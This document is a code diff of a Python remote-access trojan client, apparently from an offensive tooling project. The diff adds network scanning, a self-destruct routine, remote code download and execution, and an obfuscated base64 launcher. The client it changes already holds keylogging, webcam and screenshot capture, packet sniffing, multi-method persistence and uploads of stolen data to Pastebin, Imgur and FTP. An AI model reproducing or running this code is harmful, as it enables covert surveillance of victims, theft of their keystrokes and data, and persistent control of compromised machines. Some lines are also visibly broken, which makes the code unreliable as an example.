@@ -52,6 +52,7 @@ import json
 import zlib
 import uuid
 import numpy
+import Queue
 import base64
 import ctypes
 import pickle
@@ -67,35 +68,40 @@ import cStringIO
 import subprocess
 
 
-___debug___ = False
+___debug___ = True
 
 
 class Client(object):
+    
     global ___debug___
-    global __modules__
     global __command__
-
+    
     __command__ = {}
-    __modules__ = {}
 
     def __init__(self, **kwargs):
         self._setup     = [setattr(self, '__{}__'.format(chr(i)), kwargs.get(chr(i))) for i in range(97,123) if chr(i) in kwargs]; True
         self._exit      = 0
         self._threads   = {}
-        self._modules   = {}
-        self._info      = self._get_info()
+        self._modules   = {cmd: [getattr(self, cmd)] for cmd in ['screenshot','keylogger','webcam','persistence'}
+        self._network   = {}
+        self._result    = {}
+        self._queue     = Queue.Queue()
         self._connected = threading.Event()
+        self._info      = self._get_info()
+        self._services  = self._get_services()
         self._commands  = {cmd: getattr(self, cmd) for cmd in __command__}
-        self._result    = {mod: dict({}) for mod in self._modules}
 
-    def _command(fx, cx=__command__, mx=__modules__):
+    def _command(fx, cx=__command__):
+        
         fx.status = threading.Event()
+        
         if fx.func_name is 'persistence':
             fx.platforms = ['win32','darwin']
             fx.options   = {'registry_key':True, 'scheduled_task':True, 'wmi_object':True, 'startup_file':True, 'hidden_file':True} if os.name is 'nt' else {'launch_agent':True, 'hidden_file':True}
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
             if fx.status.is_set():
                 cx.update({fx.func_name: fx})
+                
         elif fx.func_name is 'keylogger':
             fx.platforms = ['win32','darwin','linux2']
             fx.options   = {'max_bytes': 1024, 'upload': 'pastebin'}
@@ -104,12 +110,14 @@ class Client(object):
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
             if fx.status.is_set():
                 cx.update({fx.func_name: fx})
+                
         elif fx.func_name is 'webcam':
             fx.platforms = ['win32']
             fx.options   = {'image': True, 'video': bool(), 'upload': 'imgur'}
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
             if fx.status.is_set():
                 cx.update({fx.func_name: fx})
+                
         elif fx.func_name is 'packetsniff':
             fx.platforms = ['darwin','linux2']
             fx.options   = {'duration': 300.0, 'upload': 'ftp'}
@@ -117,22 +125,26 @@ class Client(object):
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
             if fx.status.is_set():
                 cx.update({fx.func_name: fx})
+                
         elif fx.func_name is 'screenshot':
             fx.platforms = ['win32','linux2','darwin']
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
             fx.options   = {'upload': 'imgur'}
             if fx.status.is_set():
                 cx.update({fx.func_name: fx})
+                
         elif fx.func_name is 'upload':
             fx.options   = {'pastebin': {'api_key': None}, 'imgur': {'api_key': None}, 'ftp': {'host': None, 'username': None, 'password': None}}
             fx.status.set()
             cx.update({fx.func_name: fx})
+            
         elif fx.func_name is 'encryption':
             fx.options = {'block_size': 8, 'key_size': 16, 'num_rounds': 32, 'hash_algo': 'md5'}
             fx.status.set()
         elif fx.func_name is 'shell':
             fx.status.set()
             cx.update({fx.func_name: fx})
+            
         elif fx.func_name is 'admin':
             fx.platforms = ['win32']
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
@@ -141,9 +153,11 @@ class Client(object):
         else:
             fx.status.set()
             cx.update({fx.func_name: fx})
+
         return fx
 
-        # ------------------- commands ------------------------- 
+
+    # commands
 
     @_command
     def cd(self, *x):
@@ -188,7 +202,7 @@ class Client(object):
     @_command
     def jobs(self):
         """\tlist currently active jobs"""
-        return self._help_jobs()
+        return self._jobs()
 
     @_command
     def help(self, *args):
@@ -201,9 +215,14 @@ class Client(object):
         return self._help_info()
 
     @_command
-    def admin(self):
-        """\tattempt to escalate privileges"""
-        return self._admin()
+    def stop(self, x):
+        """stop a job or process"""
+        return self._stop(x)
+
+    @_command
+    def scan(self, x):
+        """find online hosts or open ports"""
+        return self._scan(x)
 
     @_command
     def start(self):
@@ -220,7 +239,12 @@ class Client(object):
     def standby(self):
         """disconnect but keep client alive"""
         return self._standby()
-    
+
+    @_command
+    def admin(self):
+        """\tattempt to escalate privileges"""
+        return self._admin()
+
     @_command
     def unzip(self, fp):
         """unzip a compressed archive/file"""
@@ -262,9 +286,9 @@ class Client(object):
         return self._launcher()
 
     @_command
-    def module(self):
+    def module(self, name):
         """\tcreate new module"""
-        return self._module()
+        return self._module(name)
 
     @_command
     def update(self, x):
@@ -301,6 +325,11 @@ class Client(object):
         """encryption <on/off> - default: on"""
         return self.encryption.options
 
+    @_command
+    def selfdestruct(self):
+        """self-destruct and leave no trace on disk"""
+        return self._selfdestruct()
+
     pwd.usage	        = 'pwd'
     kill.usage	        = 'kill'
     info.usage	        = 'info'
@@ -311,17 +340,20 @@ class Client(object):
     status.usage        = 'status'
     results.usage       = 'results'
     standby.usage       = 'standby'
-    module.usage        = 'module'
     launcher.usage      = 'launcher'
     keylogger.usage	= 'keylogger'
     screenshot.usage	= 'screenshot'
     persistence.usage	= 'persistence'
     packetsniff.usage	= 'packetsniff'
+    selfdestruct.usage  = 'selfdestruct'
     ls.usage	        = 'ls <path>'
     wget.usage	        = 'wget <url>'
     cd.usage		= 'cd <path>'
     cat.usage           = 'cat <file>'
     run.usage           = 'run <module>'
+    stop.usage          = 'stop <job>'
+    module.usage        = 'module <name>'
+    scan.usage          = 'scan <target>'
     unzip.usage	        = 'unzip <file>'
     webcam.usage        = 'webcam <mode>'
     set.usage		= 'set <cmd> x=y'
@@ -331,30 +363,59 @@ class Client(object):
     upload.usage	= 'upload [file]'
     update.usage        = 'update [url]'
     options.usage	= 'options <cmd>'
+    
 
-        # ------------------- utilities -------------------------
+    # download the a file from a target URL
 
     def _wget(self, target): return urllib.urlopen(target).read() if target.startswith('http') else 'Error: target URL must begin with http:// or https://'
     
+
+    # display the contents of a file 
+    
     def _cat(self, *path): return open(path[0]).read(4000) if os.path.isfile(path[0]) else 'Error: file not found'
+
+
+    # change the client's current working directory
         
     def _cd(self, *args): return os.chdir(args[0]) if args and os.path.isdir(args[0]) else os.chdir('.')
 
-    def _ls(self, path): return '\n'.join(os.listdir(path)) if os.path.isdir(path) else '\n'.join(os.listdir('.'))
+
+    # list contents of a target directory (defualt: current directory)
+
+    def _ls(self, path='.'): return '\n'.join(os.listdir(path)) if os.path.isdir(path) else 'Error: path not found'
+
+
+    # get the current client status
   
     def _status(self,c=None): return '{} days, {} hours, {} minutes, {} seconds\n'.format(int(time.clock() / 86400.0), int((time.clock() % 86400.0) / 3600.0), int((time.clock() % 3600.0) / 60.0), int(time.clock() % 60.0)) if not c else '{} days, {} hours, {} minutes, {} seconds'.format(int(c / 86400.0), int((c % 86400.0) / 3600.0), int((c % 3600.0) / 60.0), int(c % 60.0))
 
-    def _get_info(self): return {k:v for k,v in zip(['IP Address', 'Private IP', 'Platform', 'Version', 'Architecture', 'Username', 'Administrator', 'MAC Address', 'Machine'], [urllib2.urlopen('http://api.ipify.org').read(), socket.gethostbyname(socket.gethostname()), sys.platform, os.popen('ver').read().strip('\n') if os.name is 'nt' else ' '.join(os.uname()), '{}-bit'.format(struct.calcsize('P') * 8), os.getenv('USERNAME', os.getenv('USER')), bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0), '-'.join(uuid.uuid1().hex[20:][i:i+2] for i in range(0,11,2)), os.getenv('NAME', os.getenv('COMPUTERNAME', os.getenv('DOMAINNAME')))])}
+
+    # run a system survey and return results
+
+    def _get_info(self): return {k:v for k,v in zip(['IP Address', 'Local IP', 'Platform', 'Version', 'Architecture', 'Username', 'Administrator', 'MAC Address', 'Machine'], [urllib2.urlopen('http://api.ipify.org').read(), socket.gethostbyname(socket.gethostname()), sys.platform, os.popen('ver').read().strip('\n') if os.name is 'nt' else ' '.join(os.uname()), '{}-bit'.format(struct.calcsize('P') * 8), os.getenv('USERNAME', os.getenv('USER')), bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0), '-'.join(uuid.uuid1().hex[20:][i:i+2] for i in range(0,11,2)), os.getenv('NAME', os.getenv('COMPUTERNAME', os.getenv('DOMAINNAME')))])}
+
+
+    # get protocol and service information on standard ports
+
+    def _get_services(self): return {i.split()[1][:-4]: [i.split()[0], ' '.join(i.split()[2:])] for i in open('C:\Windows\System32\drivers\etc\services' if os.name == 'nt' else '/etc/services').readlines() if len(i.split()) > 1 if 'tcp' in i.split()[1]}
+
+
+    # display usage help for client commands
 
     def _help(self, *arg): return ' USAGE\t\t\tDESCRIPTION\n --------------------------------------------------\n ' + '\n '.join(['{}\t\t{}'.format(i.usage, i.func_doc) for i in self._commands.values() if hasattr(i, 'usage')]) + '\n'
 
+    
+    # display info about client host
+
     def _help_info(self): return '\n'.join(['  {}\t{}'.format('ENVIRONMENT','VARIABLES')] + [' --------------------------'] + [' {}\t{}'.format(a,b) for a,b in self._get_info().items()]) + '\n'
+
+
+    # display info about current jobs
 
     def _help_jobs(self): return '\n'.join(['  JOBS'] + [' -----------------------------------------------'] + [' {}{:>40}'.format(a, self._status(c=time.time()-float(self._threads[a].name))) for a in self._threads if self._threads[a].is_alive()]) + '\n'
 
-    def _debug(self, data):
-        if ___debug___:
-            print(data)
+
+    # convert an integer to raw bytes
 
     def _long_to_bytes(self, x):
         try:
@@ -362,11 +423,17 @@ class Client(object):
         except Exception as e:
             self._connected.clear()
 
+
+    # convert raw bytes to an integer
+
     def _bytes_to_long(self, x):
         try:
             return long(bytes(x).encode('hex'), 16)
         except Exception as e:
             self._connected.clear()
+            
+
+    # pad text to a length that is a multiple of cipher block size
 
     def _pad(self, s):
         try:
@@ -374,11 +441,17 @@ class Client(object):
         except Exception as e:
             self._connected.clear()
 
+
+    # split a block of raw bytes into blocks of 8
+
     def _block(self, s):
         try:
             return [s[i * self.encryption.options['block_size']:((i + 1) * self.encryption.options['block_size'])] for i in range(len(s) // self.encryption.options['block_size'])]
         except Exception as e:
             self._connected.clear()
+            
+
+    # xor two arguments together 
 
     def _xor(self, s, t):
         try:
@@ -386,12 +459,32 @@ class Client(object):
         except Exception as e:
             self._connected.clear()
 
+
+    # check if string is a valid IPv4 address
+
     def _is_ipv4_address(self, address):
         try:
             if socket.inet_aton(str(address)):
                 return True
         except:
             return False
+
+        
+    # drop in replacement of 'print' function that only prints while debugging
+
+    def _debug(self, data):
+        if ___debug___:
+            print(data)
+
+
+    # ping a target IP address
+
+    def _ping(self, host):
+        if host not in self._network and subprocess.call(str('ping -n 1 -w 90 {}' if os.name is 'nt' else 'ping -c 1 -w 90 {}').format(host), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
+            self._scan_ports(host)
+
+
+    # decompress zip file/archive
 
     def _unzip(self, path):
         if os.path.isfile(path):
@@ -403,18 +496,33 @@ class Client(object):
             result = 'Error: file not found'
         return result
 
-    def _shutdown(self):
-        try:
-            _ = os.popen('shutdown /d 1 /f').read() if os.name is 'nt' else os.popen('shutdown -h now').read()
-        except Exception as e:
-            self._debug('Shutdown error: {}'.format(str(e)))
+
+    # HTTP post request with custom headers and data
 
     def _post(self, url, headers={}, data={}):
-        dat = urllib.urlencode(data)
-        req = urllib2.Request(url, data=dat) if data else urllib2.Request(url)
-        for key, value in headers.items():
-            req.add_header(key, value)
-        return urllib2.urlopen(req).read()
+        try:
+            dat = urllib.urlencode(data)
+            req = urllib2.Request(url, data=dat) if data else urllib2.Request(url)
+            for key, value in headers.items():
+                req.add_header(key, value)
+            return urllib2.urlopen(req).read()
+        except Exception as e:
+            self._debug(str(e))
+            
+
+    # thread handler
+
+    def _threader(self):
+        while True:
+            try:
+                target, task = self.q.get()
+                getattr(self, target)(task)
+                self._queue.task_done()
+            except Exception as e:
+                break
+
+
+    # convert bytes to PNG format
 
     def _png(self, image):
         if type(image) == numpy.ndarray:
@@ -423,29 +531,33 @@ class Client(object):
         else:
             width, height = (image.width, image.height)
             data = image.rgb
-        line = width * 3
-        png_filter = struct.pack('>B', 0)
-        scanlines = b''.join([png_filter + data[y * line:y * line + line] for y in range(height)])
-        magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
-        ihdr = [b'', b'IHDR', b'', b'']
-        ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
-        ihdr[3] = struct.pack('>I', zlib.crc32(b''.join(ihdr[1:3])) & 0xffffffff)
-        ihdr[0] = struct.pack('>I', len(ihdr[2]))
-        idat = [b'', b'IDAT', zlib.compress(scanlines), b'']
-        idat[3] = struct.pack('>I', zlib.crc32(b''.join(idat[1:3])) & 0xffffffff)
-        idat[0] = struct.pack('>I', len(idat[2]))
-        iend = [b'', b'IEND', b'', b'']
-        iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
-        iend[0] = struct.pack('>I', len(iend[2]))
-        fileh = cStringIO.StringIO()
-        fileh.write(magic)
-        fileh.write(b''.join(ihdr))
-        fileh.write(b''.join(idat))
-        fileh.write(b''.join(iend))
-        fileh.seek(0)
-        return fileh
+        try:
+            line = width * 3
+            png_filter = struct.pack('>B', 0)
+            scanlines = b''.join([png_filter + data[y * line:y * line + line] for y in range(height)])
+            magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
+            ihdr = [b'', b'IHDR', b'', b'']
+            ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
+            ihdr[3] = struct.pack('>I', zlib.crc32(b''.join(ihdr[1:3])) & 0xffffffff)
+            ihdr[0] = struct.pack('>I', len(ihdr[2]))
+            idat = [b'', b'IDAT', zlib.compress(scanlines), b'']
+            idat[3] = struct.pack('>I', zlib.crc32(b''.join(idat[1:3])) & 0xffffffff)
+            idat[0] = struct.pack('>I', len(idat[2]))
+            iend = [b'', b'IEND', b'', b'']
+            iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
+            iend[0] = struct.pack('>I', len(iend[2]))
+            fileh = cStringIO.StringIO()
+            fileh.write(magic)
+            fileh.write(b''.join(ihdr))
+            fileh.write(b''.join(idat))
+            fileh.write(b''.join(iend))
+            fileh.seek(0)
+            return fileh
+        except Exception as e:
+            self._debug(str(e))
 
-    # ------------------- connection -------------------------
+
+    # connect to server
 
     def _connect(self, port=1337):
         def _addr(a, b, c):
@@ -473,9 +585,6 @@ class Client(object):
         time.sleep(5)
         return self._connect(port)
 
-
-    # ------------------- encryption -------------------------
-    
 
     # Diffie-Hellman transaction-less key exchange
 
@@ -744,12 +853,12 @@ class Client(object):
     # run module(s)
 
     def _run(self, module=None):
-        if not len(self._modules):
-            return 'usage: run <module>'
-        module = str(module).lower()
-        if module not in self._modules:
-            return "Invalid module. New modules must be added using 'new module' before running"
-        task, options = self._modules[module].items()
+        if module:
+            if module not in self._modules:
+                return "Invalid module. New modules must be added using 'new module' before running"
+            module = self._modules[str(module)]
+            for command in module:
+                options = self._commands[command].options
         self._modules.options.update(options)
         self._threads[task] = threading.Thread(target=task, name=time.time())
         self._threads[task].start()
@@ -785,7 +894,6 @@ class Client(object):
                     self._send(result, method=cmd)
             else:
                 if 'connecting' not in self._threads:
-                    self._connect()
                     t = threading.Thread(target=self._connect, name=time.time())
                     t.setDaemon(True)
                     self._threads['connecting'] = t
@@ -794,6 +902,56 @@ class Client(object):
                 if not worker.is_alive():
                     _ = self._threads.pop(task, None)
 
+
+    # scan to find online hosts and open ports
+
+    def _scan(self, args):
+        mode, _, host = str(args).lower().partition(' ')
+        if mode == 'network':           
+            self._threads['scanner'] = threading.Thread(target=self._scan_subnet, args=(host,))
+            self._threads['scanner'].daemon = True
+            self._threads['scanner'].start()
+            return "scanning client's local network"
+        elif mode == 'host':
+            if self._is_ipv4_address(host):
+                self._threads['scanner'] = threading.Thread(target=self._scan_host, args=(host,))
+                self._threads['scanner'].daemon = True
+                self._threads['scanner'].start()
+                return "scanning target: {}".format(host)
+            else:
+                return "Invalid IPv4 address - '{}'".format(host)
+        else:
+            return "usage: scan <mode> <target> \n\tmode: 'network' or 'host'\n\ttarget: a valid IPv4 address"
+
+
+    # scan the subnet of a target host
+
+    def _scan_subnet(self, host):
+        if not self._is_ipv4_address(str(host)):
+            return "Invalid IPv4 address"
+        stub = '.'.join(str(host).split('.')[:-1]) + '.%d'
+        for i in xrange(1,255):
+            self._queue.put((self._ping, stub % i))
+        for x in xrange(100):
+            t = threading.Thread(target=self._threader)
+            t.daemon = True
+            t.start()
+        t.join()
+        result = ['Local Area Network','--------------------------------------']
+        for ip in self._network:
+            result.append('')
+            result.append(ip)
+            result.append('PORT    STATE    PROTOCOL    SERVICE')
+            for port in self._network.get(ip).get('ports').keys():
+                port_info   = self._network.get(ip).get('ports').get(port)
+                protocol    = port_info.get('protocol')
+                service     = port_info.get('service')
+                banner      = port_info.get('banner')
+                state       = port_info.get('state')
+                info        = '{}\t{}\t{}\t{}'.format(str(port), str(state), str(protocol), str(service))
+                result.append(info)
+        return '\n'.join(result)
+                                 
 
     # standard startup routine
 
@@ -816,8 +974,23 @@ class Client(object):
 
 
     # kill connection and remove all traces of client
-    
+
     def _kill(self):
+        for i in self._threads:
+            t = self._threads.pop(i, None)
+        self._socket.close()
+        if hasattr(self, '__f__'):
+            f = urllib.urlopen(self._long_to_bytes(long(self.__f__))).read()
+            if os.path.isfile(f):
+                os.remove(f)
+            os.remove(self.__f__)
+        if '__file__' in globals():
+            os.remove(__file__)
+
+
+    # self-destruct and leave no trace on disk
+    
+    def _selfdestruct(self):
         try:
             self._exit = True
             for method in self.persistence.options:
@@ -826,47 +999,50 @@ class Client(object):
                     getattr(self, target)()
                 except Exception as e2:
                     self._debug('Error removing persistence: {}'.format(str(e2)))
-            try:
-                self._socket.close()
-            except: pass
-            try:
-                if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
-                    os.remove(self.__f__)
-                if '__file__' in globals():
-                    os.remove(__file__)
-            except: pass
+            self._socket.close()
+            if hasattr(self, '__f__') and os.path.isfile(urllib.urlopen(self._long_to_bytes(long(self.__f__))).read()):
+                os.remove(self.__f__)
+            if '__file__' in globals():
+                os.remove(__file__)
             for i in self._threads:
-                try:
-                    t = self._threads.pop(i, None)
-                    del t
-                except: pass
+                t = self._threads.pop(i, None)
         finally:
             shutdown = threading.Timer(1, self._shutdown)
             shutdown.start()
             exit(0)
 
-    # ------------------- update client -------------------------
+
+    # stop client job(s)
+    
+    def _stop(self, target):
+        if str(target) in self._threads:
+            _ = self._threads.pop(target, None)
+            return "Job '{}' was stopped.".format(target)
+        else:
+            return self.stop.usage
+
+
+    # update client with download from target URL
 
     def _update(self, uri, *kwargs):
+        global main
         try:
-            name = os.path.splitext(os.path.basename(uri))[0] if 'name' not in kwargs else str(kwargs.get('name'))
-            module = imp.new_module(name)
+            name = os.path.splitext(os.path.basename(uri))[0]
             source = urllib2.urlopen(uri).read()
             try:
                 source = json.loads(source)
-                client = Client(**source)
-                client.run()
+                self = main(**source)
+                self.start()
             except:
-                code = compile(source, name, 'exec')
-                exec code in module.__dict__
+                module = imp.new_module()
+                exec source in module.__dict__
                 self._modules[name] = module
-                return module
+                return "New module '{}' successfully created".format(name)
         except Exception as e:
             self._debug("Error creating module: {}".format(str(e)))
 
 
-     # ------------------- new module ------------------- 
-
+     # create a new module and add it to the client 
 
     def _module(self, name):
         tasks  = []
@@ -874,7 +1050,7 @@ class Client(object):
         while True:
             text  += '\n\tadd a task: '
             self._send(text, 'prompt')
-            data  = self._receieve()
+            data  = self._receieve().rstrip()
             if not len(data):
                 if len(tasks):
                     text += '\n\tenter run interval (minutes): '
@@ -883,7 +1059,7 @@ class Client(object):
                     if str(interval).isdigit():
                         tasks.append(time.sleep(int(interval)))
                         module = {name: tasks}
-                        self._save_module(module)
+                        self._modules(module)
                         return "module {} successfully added"
                 else:
                     break
@@ -893,32 +1069,25 @@ class Client(object):
             tasks.append(getattr(self, cmd))
 
 
-    # ------------------- generate encrypted launcher -----------------------
+    # generate encrypted launcher
 
     def _launcher(self):
         if hasattr(self, '__l__') and hasattr(self, '__u__'):
-            adjectives  = [i.title().replace('-','') for i in urllib2.urlopen('https://raw.githubusercontent.com/hathcox/Madlibs/master/adjective.list').read().split()]
-            nouns       = [i.title().replace('-','') for i in urllib2.urlopen('https://raw.githubusercontent.com/hathcox/Madlibs/master/nouns.list').read().split()]
-            random_var  = lambda: adjectives.pop(adjectives.index(random.choice(adjectives))) + adjectives.pop(adjectives.index(random.choice(adjectives))) + nouns.pop(nouns.index(random.choice(nouns)))
             key         = str().join(random.choice([chr(i) for i in range(48, 123) if chr(i).isalnum()]) for x in range(16))
             attr        = {chr(i): getattr(self, '__{}__'.format(chr(i))) for i in range(97,123) if hasattr(self, '__{}__'.format(chr(i)))}
             attr['z']   = bytes(long(key.encode('hex'), 16))
             ciphertext  = self._encrypt(urllib.urlopen(self._long_to_bytes(long(self.__u__))).read(), key)
             attr['u']   = bytes(long(self._upload_pastebin(ciphertext).encode('hex'), 16)).strip('L')[-20:]
             launcher    = urllib.urlopen(self._long_to_bytes(long(self.__l__))).read()
-            code        = "{}\n\nif __name__ == '__main__':\n\tmain(config={})".format(launcher, clientpaste)
-            output_file = os.path.join(os.path.expandvars('%TEMP%'), random_var() + '.py') if os.name is 'nt' else os.path.join('/tmp', random_var() + '.py')
-            pkg         = {'b64decode':'base64','unpack':'struct','pack':'struct','urlopen':'urllib'}
-            var         = {k: random_var() for k in pkg}
-            imports     = ['from {} import {} as {}'.format(v, k, var[k]) for k,v in pkg.items()]                        
+            code        = "{}\n\nif __name__ == '__main__':\n\tmain(config={})".format(launcher, attr['u'])
             target      = self._upload_pastebin(result)
             with file(output_file, 'w') as fp:
                 fp.write(";".join(imports) + "\n")
-                fp.write('exec({}("{}"))'.format(var['b64decode'], base64.b64encode('exec({}("{}").read())'.format(var['urlopen'], target))))
+                fp.write('exec(%s(\"%s\"))'.format('b64decode', base64.b64encode('exec(%s(\"%s\").read())'.format('urlopen', target))))
             return output_file
         
 
-    # ------------------- remote upload -------------------------
+    # ------------------- uploaders ---------------------
 
     def _upload(self, *args):
         if len(args) != 2:
@@ -933,7 +1102,7 @@ class Client(object):
             return 'Upload error: {}'.format(str(e))
 
 
-    # Imgur - upload webcam images, screenshots, etc.
+    # remotely upload target file to Imgur
 
     def _upload_imgur(self, source):
         if not self.upload.options['imgur'].get('api_key'):
@@ -950,7 +1119,7 @@ class Client(object):
         return result
 
 
-    # Pastebin - upload keylogs, documents, etc.
+    # remotely upload target file to Pastebin
 
     def _upload_pastebin(self, source):
         if not self.upload.status.is_set() and not override:
@@ -971,7 +1140,7 @@ class Client(object):
         return result
     
 
-    # FTP - quickly upload large files, many  files, etc.
+    # remotely upload target file to FTP server
 
     def _upload_ftp(self, source):
         if not self.upload.status and not override:
@@ -989,6 +1158,7 @@ class Client(object):
         except Exception as e:
             result = str(e)
         return result
+
     
     # ------------------- keylogger ----------------------
 
@@ -1000,7 +1170,7 @@ class Client(object):
         return 'Keylogger running.'.format(time.ctime())
 
 
-    # keylogger event on key down
+    # keylogger - event on key down
 
     def _keylogger_event(self, event):
         if event.WindowName != self.keylogger.window:
@@ -1020,7 +1190,7 @@ class Client(object):
         return True
 
 
-    # keylogger log upload
+    # keylogger - log monitor and uploader
 
     def _keylogger_helper(self):
         while True:
@@ -1051,7 +1221,7 @@ class Client(object):
                 break
                
 
-    # keylogger managemnet
+    # keylogging - handler
 
     def _keylogger_manager(self):
         keylogger_helper = threading.Thread(target=self._keylogger_helper)
@@ -1073,6 +1243,7 @@ class Client(object):
             else:
                 time.sleep(0.1)
 
+
     # ------------------- screenshot ---------------------
 
     def _screenshot(self):
@@ -1086,7 +1257,8 @@ class Client(object):
         self._result['screenshot'][time.ctime()] = result
         return result
 
-    # ------------------- webcam -------------------------
+
+    # ------------------- webcam ---------------------
 
     def _webcam(self, args=None):
         if 'webcam' not in self._result:
@@ -1200,6 +1372,7 @@ class Client(object):
             sock.close()
             t2 = time.time() - t1
         return 'Live stream for {}'.format(self._status(t2))
+    
 
     # ------------------- packetsniffer ------------------------
 
@@ -1366,6 +1539,7 @@ class Client(object):
         except Exception as e:
             result = str(e)
         return result
+
     
     # ------------------- persistence ------------------------
 
@@ -1606,7 +1780,7 @@ class Client(object):
 def main(*args, **kwargs):
     if 'w' in kwargs:
         exec "import urllib" in globals()
-        imports = urllib.urlopen(bytes(bytearray.fromhex(hex(long(kwargs['w'])).strip('0x').strip('L')))).read()
+        imports = urllib.urlopen(bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(kwargs['w']))).strip('0x').strip('L')))).read()
         exec imports in globals()
     if 'f' not in kwargs and '__file__' in globals():
         kwargs['f'] = bytes(long(globals()['__file__'].encode('hex'), 16))
@@ -1614,5 +1788,19 @@ def main(*args, **kwargs):
     return client
 
 
-
-
+if __name__ == '__main__':
+    m = main(**{
+          "a": "81547499566857937463", 
+          "c": "80194446127549985092", 
+          "b": "79965932444658643559", 
+          "e": "78307486292777321027", 
+          "d": "81472904329291720535", 
+          "g": "81336687865394389318", 
+          "k": "78307978800637761077", 
+          "l": "81121075829415236930", 
+          "q": "79959173599698569031", 
+          "s": "81399447134546511973", 
+          "t": "77809841759794002027",
+          "u": "80469770247405061754",
+          "w": "77815713142069688900"
+    })
